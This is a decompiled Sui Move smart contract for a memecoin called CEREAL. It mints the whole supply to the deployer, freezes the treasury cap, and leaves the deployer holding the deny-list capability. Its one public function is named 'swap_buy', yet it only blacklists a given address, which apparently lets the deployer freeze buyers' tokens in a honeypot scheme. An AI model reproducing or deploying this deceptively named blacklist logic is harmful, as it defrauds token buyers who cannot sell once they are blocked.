module 0x9baf048afeaeaf1ed76cb74e96e481edf9028fae8575541fffd2265aa8901591::cereal {
    struct CEREAL has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CEREAL, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CEREAL>(arg0, 9, b"CEREAL", b"Cereal Guy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmP3WgHYvzNYGKtZbajTk7FiEcJBjw3n3CrpHJeDJ9QBvu"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CEREAL>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CEREAL>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CEREAL>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CEREAL>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CEREAL>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CEREAL>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

